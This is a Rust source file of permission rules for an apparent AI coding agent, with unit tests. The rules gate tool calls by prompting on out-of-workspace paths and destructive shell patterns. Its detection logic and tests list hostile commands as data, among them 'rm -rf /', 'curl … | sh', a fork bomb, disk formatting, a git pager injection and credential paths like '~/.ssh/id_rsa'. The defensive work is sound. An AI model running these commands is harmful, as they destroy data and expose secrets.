//! A starter set of sensible policy rules. First match wins in the engine.

use crate::core::permissions::{Decision, PermissionRequest, Rule};
use std::collections::HashSet;
use std::sync::Arc;

// Tools that never mutate anything themselves. `task` and the coordination tools
// (spawn_agent/send_message/list_agents) spawn or message subagents, but every
// tool call *inside* a subagent is still gated by this same engine, so approving
// the spawn/message grants nothing on its own — auto-allow to avoid a pointless
// prompt before the real, individually-gated work.
const READ_ONLY: &[&str] = &[
    "read_file",
    "list_dir",
    "glob",
    "grep",
    "todo_write",
    "memory",
    "task",
    "workflow",
    "explore",
    "spawn_agent",
    "send_message",
    "stop_agent",
    "list_agents",
    "lsp",
    "web_fetch",
    "web_search",
    "job_status",
    "job_output",
    // Records the agent's own final answer into an in-memory sink (workflow
    // structured output) — touches nothing on disk, so a prompt would be pure
    // friction.
    "structured_output",
    // Interaction tools handle their own user consent (or only change the
    // interaction mode), so a redundant permission prompt would just double-ask.
    "ask_user",
    "enter_plan",
    "exit_plan",
];

/// Read-only tools are always safe.
pub fn allow_read_only() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if READ_ONLY.contains(&req.tool.as_str()) {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

/// `code_action` mutates files in apply mode (`apply` set) but is read-only in
/// list mode (no `apply` — it just asks the server what's available). Auto-allow
/// the list case so discovering actions never prompts; apply still gets gated.
pub fn allow_code_action_list() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if req.tool == "code_action" && req.input.get("apply").is_none() {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

/// File tools and the input key holding their target path. Used to force a prompt
/// when the path escapes the workspace root.
const PATH_TOOLS: &[(&str, &str)] = &[
    ("read_file", "path"),
    ("write_file", "path"),
    ("edit_file", "path"),
    ("multi_edit", "path"),
    ("list_dir", "path"),
    ("glob", "path"),
    ("grep", "path"),
    ("lsp", "filePath"),
    ("rename_symbol", "filePath"),
    ("code_action", "filePath"),
];

/// Force a prompt for any tool call that touches a path OUTSIDE the workspace root
/// (`req.cwd`). Covers the file tools (via their `path`/`filePath` input) and bash
/// (via every literal path-like argument the shell analyzer surfaced). Returns `Ask`
/// — which wins over a later auto-allow — so an out-of-workspace read/write is never
/// silently auto-approved; the human decides (or a prior session grant satisfies it).
/// In-workspace paths abstain (`None`) so normal auto-approve still applies.
pub fn flag_out_of_workspace_paths() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        // File tools: check the single declared path input.
        if let Some((_, key)) = PATH_TOOLS.iter().find(|(t, _)| *t == req.tool) {
            if let Some(p) = req.input.get(*key).and_then(|v| v.as_str()) {
                if path_escapes_workspace(&req.cwd, p) {
                    return Some(Decision::Ask);
                }
            }
            return None;
        }
        // Bash: check every literal path-like argument the analyzer found. A command
        // reading/writing outside the workspace (`cat /etc/hosts`, `cp x ~/..`) must
        // prompt even if the command name itself is allowlisted.
        if req.tool == "bash" {
            if let Some(bash) = req.bash.as_ref() {
                for argv in &bash.commands {
                    for arg in argv.iter().skip(1) {
                        if looks_like_path(arg) && path_escapes_workspace(&req.cwd, arg) {
                            return Some(Decision::Ask);
                        }
                    }
                }
            }
        }
        None
    })
}

/// Whether an argument looks like a filesystem path we should confine — an absolute
/// path, a `~`/`~user` home reference, or a relative path with a `..` component or a
/// `/`. Bare flags (`-la`), option values, and plain tokens (`build`) are ignored so
/// we don't prompt on every command.
fn looks_like_path(arg: &str) -> bool {
    if arg.starts_with('-') {
        return false;
    }
    arg.starts_with('/')
        || arg.starts_with('~')
        || arg.split('/').any(|c| c == "..")
        || arg.contains('/')
}

/// Whether `path` (resolved against `cwd` the same way the tools resolve it) points
/// OUTSIDE the workspace root. Absolute paths and `~` home references are always
/// outside unless they fall under `cwd`. Normalization is LEXICAL (`.`/`..` folded
/// without touching the filesystem) so it works for not-yet-existing write targets;
/// a `..` that pops above the root is therefore treated as an escape (fail safe).
pub fn path_escapes_workspace(cwd: &str, path: &str) -> bool {
    use std::path::{Component, Path, PathBuf};

    // `~` is a shell home reference — never inside the workspace.
    if path.starts_with('~') {
        return true;
    }

    let resolved: PathBuf = {
        let p = Path::new(path);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            Path::new(cwd).join(p)
        }
    };
    let root = Path::new(cwd);

    // Lexically normalize both, folding `.`/`..` without hitting disk.
    let norm = |p: &Path| -> Option<PathBuf> {
        let mut out: Vec<Component> = Vec::new();
        for c in p.components() {
            match c {
                Component::CurDir => {}
                Component::ParentDir => {
                    match out.last() {
                        Some(Component::Normal(_)) => {
                            out.pop();
                        }
                        // A `..` above the root (or after another `..`) → can't stay
                        // confined; signal escape by returning None.
                        _ => return None,
                    }
                }
                other => out.push(other),
            }
        }
        Some(out.iter().collect())
    };

    let (Some(nr), Some(nroot)) = (norm(&resolved), norm(root)) else {
        return true; // popped above root ⇒ escape
    };
    !nr.starts_with(&nroot)
}

/// Force a prompt for obviously destructive shell patterns. We NEVER auto-reject a
/// command — a risky one is surfaced to the user to approve or decline, not silently
/// denied. This rule returns `Ask` (which wins over a later auto-allow) so patterns
/// like `curl | sh`, `rm -rf /`, fork bombs, etc. can't slip through an allowlist
/// but also aren't hard-blocked; the human decides.
pub fn flag_dangerous_bash() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if req.tool != "bash" {
            return None;
        }
        let bash = req.bash.as_ref()?;

        // curl … | sh  and friends (only a real pipe into an interpreter).
        if bash.pipes_to_shell {
            return Some(Decision::Ask);
        }

        // Classic fork bomb, matched on the raw text (the tokenizer can't model it).
        let raw_nospace: String = bash.raw.chars().filter(|c| !c.is_whitespace()).collect();
        if raw_nospace.contains(":(){:|:&};:") {
            return Some(Decision::Ask);
        }

        for argv in &bash.commands {
            let cmd = match argv.first() {
                Some(c) => c,
                None => continue,
            };
            let mut name = cmd.rsplit('/').next().unwrap_or(cmd);
            // See through common exec-wrappers to the real command: `env rm …`,
            // `sudo rm …`, `command rm …`, `nice rm …`, `\rm` (leading backslash).
            let mut rest = &argv[1..];
            name = name.trim_start_matches('\\');
            while matches!(
                name,
                "env" | "sudo" | "doas" | "command" | "nice" | "nohup" | "time"
            ) {
                match rest.first() {
                    Some(next) => {
                        name = next
                            .rsplit('/')
                            .next()
                            .unwrap_or(next)
                            .trim_start_matches('\\');
                        rest = &rest[1..];
                    }
                    None => break,
                }
            }
            let args = rest;

            // Recursive/forced rm targeting a root-ish or home path.
            if name == "rm" {
                let recursive = args
                    .iter()
                    .any(|a| a == "--recursive" || (a.starts_with('-') && a.contains('r')));
                if recursive && args.iter().any(|a| is_dangerous_delete_path(a)) {
                    return Some(Decision::Ask);
                }
            }
            // find … -delete / -exec rm is an rm in disguise.
            if name == "find"
                && args
                    .iter()
                    .any(|a| a == "-delete" || a == "-exec" || a == "-execdir")
            {
                return Some(Decision::Ask);
            }
            if name == "dd" && args.iter().any(|a| a.starts_with("of=/dev/")) {
                return Some(Decision::Ask);
            }
            // Filesystem / device / power commands (match name prefix for mkfs.*).
            if name == "shutdown"
                || name == "reboot"
                || name == "halt"
                || name == "poweroff"
                || name == "shred"
                || name.starts_with("mkfs")
            {
                return Some(Decision::Ask);
            }
            // chmod/chown -R on a root-ish path.
            if (name == "chmod" || name == "chown")
                && args.iter().any(|a| a.starts_with('-') && a.contains('R'))
                && args.iter().any(|a| is_dangerous_delete_path(a))
            {
                return Some(Decision::Ask);
            }
        }
        None
    })
}

/// Whether a path argument points at a root-ish or home location we refuse to let
/// a recursive delete/chmod touch. Broader than an exact `/` match so `rm -rf /etc`,
/// `rm -rf ~/`, `rm -rf /*` are all caught.
fn is_dangerous_delete_path(a: &str) -> bool {
    let p = a.trim_end_matches('/');
    p.is_empty() // was just "/"
        || a == "/*"
        || a == "~"
        || a.starts_with("~/")
        || a == "$HOME"
        || a.starts_with("$HOME/")
        || a.starts_with("/*")
        // Absolute system dirs.
        || matches!(
            p,
            "/etc" | "/usr" | "/var" | "/bin" | "/sbin" | "/lib" | "/boot" | "/dev"
                | "/System" | "/Applications" | "/home" | "/root" | "/Users"
        )
}

/// Commands that are effectively "run arbitrary code" — interpreters and
/// exec-wrappers. These must NEVER be auto-allowed by name (e.g. `python -c …`,
/// `find -exec …`, `env rm …`, `xargs rm …`), even if a user puts them on the
/// allow list, because the real action hides in their arguments.
const NEVER_AUTO_ALLOW: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "ksh",
    "python",
    "python3",
    "node",
    "deno",
    "bun",
    "ruby",
    "perl",
    "php",
    "lua",
    "Rscript",
    "osascript",
    "env",
    "xargs",
    "find",
    "eval",
    "exec",
    "command",
    "nice",
    "nohup",
    "time",
    "timeout",
    "sudo",
    "doas",
    "ssh",
    "watch",
    "make",
    "awk",
    "gawk",
];

fn base_name(cmd: &str) -> &str {
    cmd.rsplit('/').next().unwrap_or(cmd)
}

/// Git subcommands that only read repository state — safe to auto-allow.
const GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "show",
    "log",
    "branch",
    "tag",
    "describe",
    "rev-parse",
    "ls-files",
    "ls-remote",
    "cat-file",
    "blame",
    "shortlog",
    "remote",
    "reflog",
    "whatchanged",
    "grep",
];

/// Whether a `git` invocation (args after `git`) is a read-only subcommand with no
/// execution-injecting global flags. `git` can run arbitrary code via globals like
/// `-c core.pager=cmd` / `-c alias.x=!sh`, `-C`, `--exec-path`, `--upload-pack`, or
/// mutating subcommands (`push`, `reset`, `commit`), so anything not explicitly
/// recognized here falls through to a prompt.
fn git_is_read_only(args: &[String]) -> bool {
    let mut i = 0;
    // Skip only a conservative set of harmless global flags. Any `-c`/`-C`/exec-path
    // style flag, or an unknown flag, is not auto-approvable.
    while let Some(arg) = args.get(i) {
        if arg == "--no-pager" || arg == "--paginate" || arg == "--no-optional-locks" {
            i += 1;
            continue;
        }
        if arg.starts_with('-') {
            // Includes `-c`, `-C`, `--exec-path`, `--git-dir`, `--work-tree`,
            // `--namespace`, `--upload-pack`, and any unrecognized flag.
            return false;
        }
        break;
    }
    match args.get(i) {
        Some(sub) => GIT_READ_ONLY_SUBCOMMANDS.contains(&sub.as_str()),
        None => false,
    }
}

/// Allow a curated allowlist of harmless shell commands without asking. Refuses to
/// auto-allow anything containing un-analyzable shell metacharacters (command
/// substitution, subshells, newlines) or any interpreter/exec-wrapper — those
/// always fall through to a prompt.
pub fn allow_bash_commands(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if req.tool != "bash" {
            return None;
        }
        let bash = req.bash.as_ref()?;
        // Fail closed: if the command didn't parse cleanly, or hides code we can't
        // fully analyze, never auto-allow — fall through to a prompt.
        if !bash.analyzable || bash.commands.is_empty() {
            return None;
        }
        // An output/append redirection (`echo x > .zshrc`) is a file mutation the
        // harmless command name hides. Never auto-allow a redirecting command.
        if bash.has_output_redirect {
            return None;
        }
        // Every command that would run (including ones the AST surfaced from inside
        // `$( … )`, subshells, and pipes) must be an allowlisted, non-interpreter
        // command — otherwise a dangerous one could hide in a substitution.
        let all_safe = bash.commands.iter().all(|argv| {
            let name = match argv.first() {
                Some(c) => base_name(c),
                None => return false,
            };
            if NEVER_AUTO_ALLOW.contains(&name) || !set.contains(name) {
                return false;
            }
            // `git` is on the allowlist but is arbitrary code execution in general
            // (`git -c core.pager=cmd log`, `!`-aliases, hooks, `push`, `reset`).
            // Only auto-allow explicitly read-only subcommands with no exec-injecting
            // global flags; everything else falls through to a prompt.
            if name == "git" {
                return git_is_read_only(&argv[1..]);
            }
            true
        });
        if all_safe {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

/// Allow tools whose name is in the list.
pub fn allow_tools(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if set.contains(&req.tool) {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

/// Deny tools whose name is in the list.
pub fn deny_tools(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if set.contains(&req.tool) {
            Some(Decision::Deny)
        } else {
            None
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn req(tool: &str) -> PermissionRequest {
        PermissionRequest {
            tool: tool.to_string(),
            input: serde_json::Value::Null,
            cwd: ".".to_string(),
            bash: None,
            preview: None,
            agent: None,
            read_only: false,
        }
    }

    #[test]
    fn coordination_tools_are_auto_allowed() {
        let rule = allow_read_only();
        // spawn_agent / send_message / list_agents must never prompt — spawning
        // and messaging grant nothing; the real work inside is separately gated.
        for tool in ["spawn_agent", "send_message", "list_agents", "task"] {
            assert_eq!(
                rule(&req(tool)),
                Some(Decision::Allow),
                "{tool} should be auto-allowed"
            );
        }
    }

    #[test]
    fn structured_output_is_auto_allowed() {
        // Recording the model's own answer into an in-memory sink mutates nothing —
        // it must never prompt, or every workflow agent would stall on a dialog.
        assert_eq!(
            allow_read_only()(&req("structured_output")),
            Some(Decision::Allow)
        );
    }

    #[test]
    fn mutating_tools_are_not_auto_allowed() {
        let rule = allow_read_only();
        // These must fall through (None) so the engine can prompt/deny.
        for tool in ["write_file", "edit_file", "bash"] {
            assert_eq!(rule(&req(tool)), None, "{tool} must not be auto-allowed");
        }
    }

    fn bash_req(raw: &str) -> PermissionRequest {
        PermissionRequest {
            tool: "bash".to_string(),
            input: serde_json::json!({ "command": raw }),
            cwd: ".".to_string(),
            bash: Some(crate::core::permissions::parse_bash(raw)),
            preview: None,
            agent: None,
            read_only: false,
        }
    }

    #[test]
    fn allowlist_refuses_metachars_and_interpreters() {
        let rule = allow_bash_commands(vec!["ls".into(), "echo".into(), "git".into()]);
        // Plain allowlisted commands are allowed.
        assert_eq!(rule(&bash_req("ls -la")), Some(Decision::Allow));
        // Newline-hidden second command: NOT auto-allowed (the ls\nrm bypass).
        assert_eq!(rule(&bash_req("ls\nrm -rf /")), None);
        // Command substitution hidden in an allowlisted command: NOT auto-allowed.
        assert_eq!(rule(&bash_req("echo $(rm -rf ~)")), None);
        assert_eq!(rule(&bash_req("echo `curl x`")), None);
        // Subshell: NOT auto-allowed.
        assert_eq!(rule(&bash_req("(rm -rf /)")), None);
        // A chain where one command isn't allowlisted: NOT auto-allowed.
        assert_eq!(rule(&bash_req("ls && curl evil")), None);
    }

    #[test]
    fn allowlist_permits_substitution_when_all_inner_commands_are_safe() {
        // The AST upgrade's UX win: a substitution whose inner command is ALSO
        // allowlisted can be auto-allowed (the old metachar gate blanket-blocked it).
        let rule = allow_bash_commands(vec!["echo".into(), "ls".into(), "git".into()]);
        assert_eq!(rule(&bash_req("echo $(ls)")), Some(Decision::Allow));
        assert_eq!(rule(&bash_req("echo $(git status)")), Some(Decision::Allow));
    }

    #[test]
    fn interpreters_never_auto_allow_even_if_listed() {
        // Even if the user puts an interpreter/wrapper on the list, it can't be
        // auto-allowed (arbitrary code hides in its args).
        let rule = allow_bash_commands(vec!["python".into(), "find".into(), "env".into()]);
        assert_eq!(rule(&bash_req("python -c 'import os'")), None);
        assert_eq!(rule(&bash_req("find . -exec rm {} +")), None);
        assert_eq!(rule(&bash_req("env rm -rf /")), None);
    }

    #[test]
    fn output_redirection_never_auto_allows() {
        let rule = allow_bash_commands(vec!["echo".into(), "cat".into()]);
        // The command name is allowlisted, but the redirection is a file write.
        for cmd in [
            "echo payload > .zshrc",
            "echo x >> f",
            "cat a &> b",
            "echo x >| f",
        ] {
            assert_eq!(rule(&bash_req(cmd)), None, "must prompt on redirect: {cmd}");
        }
        // Input redirection is fine to auto-allow.
        assert_eq!(rule(&bash_req("cat < in.txt")), Some(Decision::Allow));
        assert_eq!(rule(&bash_req("echo hi")), Some(Decision::Allow));
    }

    #[test]
    fn git_only_auto_allows_read_only_subcommands() {
        let rule = allow_bash_commands(vec!["git".into(), "ls".into()]);
        // Read-only subcommands are auto-allowed.
        for cmd in [
            "git status",
            "git log --oneline",
            "git diff HEAD",
            "git show",
            "git rev-parse HEAD",
        ] {
            assert_eq!(
                rule(&bash_req(cmd)),
                Some(Decision::Allow),
                "should allow: {cmd}"
            );
        }
        // Mutating / arbitrary-exec forms fall through to a prompt.
        for cmd in [
            "git commit -m x",
            "git add .",
            "git push",
            "git reset --hard",
            "git clean -fd",
            "git -c core.pager=touch\\ pwned log",
            "git -C /etc status",
            "git foobar",
        ] {
            assert_eq!(rule(&bash_req(cmd)), None, "should prompt: {cmd}");
        }
    }

    #[test]
    fn workspace_escape_detection() {
        assert!(path_escapes_workspace("/work", "/etc/hosts"));
        assert!(path_escapes_workspace("/work", "../../secrets"));
        assert!(path_escapes_workspace("/work", "~/.ssh/id_rsa"));
        assert!(path_escapes_workspace("/work", "sub/../../out"));
        // In-workspace paths do NOT escape.
        assert!(!path_escapes_workspace("/work", "src/main.rs"));
        assert!(!path_escapes_workspace("/work", "/work/src/x"));
        assert!(!path_escapes_workspace("/work", "./a/../b"));
        assert!(!path_escapes_workspace("/work", "."));
    }

    #[test]
    fn out_of_workspace_file_tool_prompts_but_in_workspace_abstains() {
        let rule = flag_out_of_workspace_paths();
        let file_req = |tool: &str, path: &str| PermissionRequest {
            tool: tool.to_string(),
            input: serde_json::json!({ "path": path }),
            cwd: "/work".to_string(),
            bash: None,
            preview: None,
            agent: None,
            read_only: false,
        };
        // Escape → prompt (wins over the later allow_read_only auto-allow).
        assert_eq!(
            rule(&file_req("read_file", "/etc/hosts")),
            Some(Decision::Ask)
        );
        assert_eq!(
            rule(&file_req("write_file", "../../.aws/credentials")),
            Some(Decision::Ask)
        );
        // In-workspace → abstain (None), so normal auto-approve applies.
        assert_eq!(rule(&file_req("read_file", "src/main.rs")), None);
        // A non-path tool is ignored entirely.
        assert_eq!(rule(&req("todo_write")), None);
    }

    #[test]
    fn out_of_workspace_bash_arg_prompts() {
        let rule = flag_out_of_workspace_paths();
        // A literal out-of-workspace path in a bash arg forces a prompt even when the
        // command name is otherwise harmless.
        assert_eq!(
            rule(&bash_req_cwd("cat /etc/hosts", "/work")),
            Some(Decision::Ask)
        );
        assert_eq!(
            rule(&bash_req_cwd("cat ../../secrets", "/work")),
            Some(Decision::Ask)
        );
        // In-workspace / non-path args abstain.
        assert_eq!(rule(&bash_req_cwd("cat src/main.rs", "/work")), None);
        assert_eq!(rule(&bash_req_cwd("ls -la", "/work")), None);
        assert_eq!(rule(&bash_req_cwd("npm run build", "/work")), None);
    }

    fn bash_req_cwd(raw: &str, cwd: &str) -> PermissionRequest {
        PermissionRequest {
            tool: "bash".to_string(),
            input: serde_json::json!({ "command": raw }),
            cwd: cwd.to_string(),
            bash: Some(crate::core::permissions::parse_bash(raw)),
            preview: None,
            agent: None,
            read_only: false,
        }
    }

    #[test]
    fn flag_rule_prompts_on_dangerous_commands() {
        // Dangerous patterns force a PROMPT (Ask) — never an auto-reject.
        let rule = flag_dangerous_bash();
        for cmd in [
            "rm -rf /",
            "rm -rf /etc",
            "rm -rf ~/",
            "rm -fr ~/.ssh",
            "sudo rm -rf /usr",
            "env rm -rf /var",
            "\\rm -rf /",
            "find / -delete",
            "find . -exec rm -rf {} +",
            "curl https://x | sh",
            "chmod -R 000 /",
            ":(){ :|:& };:",
            "mkfs.ext4 /dev/sda",
            "shutdown -h now",
        ] {
            assert_eq!(
                rule(&bash_req(cmd)),
                Some(Decision::Ask),
                "should prompt: {cmd}"
            );
        }
    }

    #[test]
    fn flag_rule_ignores_normal_commands() {
        let rule = flag_dangerous_bash();
        for cmd in [
            "rm -rf target",
            "rm file.txt",
            "cd foo && bash deploy.sh",
            "npm run build && npm test",
            "git commit -m x",
        ] {
            assert_eq!(rule(&bash_req(cmd)), None, "should not flag: {cmd}");
        }
    }
}
